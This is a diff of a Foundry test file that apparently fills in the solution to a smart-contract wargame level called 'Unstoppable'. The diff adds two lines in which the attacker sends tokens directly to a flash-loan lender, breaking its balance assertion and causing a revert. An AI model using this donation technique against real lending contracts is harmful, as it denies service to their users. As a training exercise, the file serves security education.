@@ -57,12 +57,8 @@ contract Unstoppable is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-        /**
-         * EXPLOIT END *
-         */
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender),dvt.balanceOf(attacker));
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
